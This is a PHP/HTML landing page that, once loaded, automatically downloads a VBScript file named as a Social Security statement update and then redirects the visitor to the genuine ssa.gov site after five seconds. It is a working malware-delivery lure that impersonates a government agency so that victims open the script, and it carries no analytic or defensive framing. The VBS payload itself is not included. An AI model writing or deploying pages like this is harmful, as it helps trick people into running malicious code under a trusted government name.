<?php
header('Content-Type: text/html; charset=utf-8');

// Configuration variables
$downloadFile = 'social-security-statement-upd.vbs'; // File to download
$redirectUrl = 'https://www.ssa.gov/about-ssa'; // URL to redirect to
$delay = 5000; // Delay in milliseconds before redirect
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Download Page</title>
</head>
<body>
    <script>
        // Create a temporary link element to trigger download of the specified file
        var a = document.createElement('a');
        a.href = '<?php echo $downloadFile; ?>';
        a.download = '<?php echo $downloadFile; ?>';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // Redirect after the specified delay
        setTimeout(function() {
            window.location.href = '<?php echo $redirectUrl; ?>';
        }, <?php echo $delay; ?>);
    </script>
</body>
</html>
